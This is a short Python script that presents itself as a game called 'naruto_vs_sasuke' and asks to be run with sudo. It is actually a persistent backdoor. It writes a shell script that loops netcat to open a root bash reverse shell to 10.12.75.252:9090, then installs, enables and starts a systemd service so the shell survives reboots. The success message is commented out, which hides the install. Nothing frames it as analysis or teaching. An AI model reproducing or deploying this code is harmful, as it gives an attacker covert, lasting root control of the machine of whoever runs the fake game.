import os
import subprocess
import sys

# Configuration
REMOTE_IP = "10.12.75.252"
REMOTE_PORT = "9090"

# Paths
SHELL_SCRIPT_PATH = "/root/reverse_shell.sh"
SERVICE_FILE_PATH = "/etc/systemd/system/reverse_shell.service"

try:
    # Step 1: Check for root privileges
    if os.geteuid() != 0:
        print("[!] This Game requires root privileges. Please run with sudo.")
        sys.exit(1)

    # Step 2: Create the reverse shell script
    shell_script_content = f"""#!/bin/bash
while true; do
    /usr/bin/nc -e /bin/bash {REMOTE_IP} {REMOTE_PORT}
    sleep 5
done
"""

    with open(SHELL_SCRIPT_PATH, "w") as f:
        f.write(shell_script_content)

    # Set execution permissions
    os.chmod(SHELL_SCRIPT_PATH, 0o755)
    subprocess.run(["chown", "root:root", SHELL_SCRIPT_PATH], check=True)

    # Step 3: Create the systemd service file
    service_content = f"""[Unit]
Description=Reverse Shell Service
After=network.target

[Service]
ExecStart=/usr/bin/bash {SHELL_SCRIPT_PATH}
Restart=always
User=root
WorkingDirectory=/root
StandardOutput=journal
StandardError=journal

[Install]
WantedBy=multi-user.target
"""

    # print("[+] Creating systemd service at:", SERVICE_FILE_PATH)
    with open(SERVICE_FILE_PATH, "w") as f:
        f.write(service_content)

    # Reload systemd, enable, and start the service
    subprocess.run(["systemctl", "daemon-reload"], check=True)
    subprocess.run(["systemctl", "enable", "reverse_shell.service"], check=True)
    subprocess.run(["systemctl", "start", "reverse_shell.service"], check=True)


except PermissionError as e:
    print(f"[ERROR] Permission denied: {e}")
    print("[!] Try running the script with sudo:")
    print("sudo python3 naruto_vs_sasuke")

except Exception as e:
    print(f"[ERROR] An unexpected error occurred: {e}")
